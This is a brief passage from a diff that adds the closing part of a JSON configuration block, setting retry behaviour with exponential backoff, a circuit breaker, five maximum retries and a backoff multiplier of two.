+      "ExponentialBackoff": true,
+      "CircuitBreaker": true,
+      "MaxRetries": 5,
+      "BackoffMultiplier": 2
+    }
+  }
+}
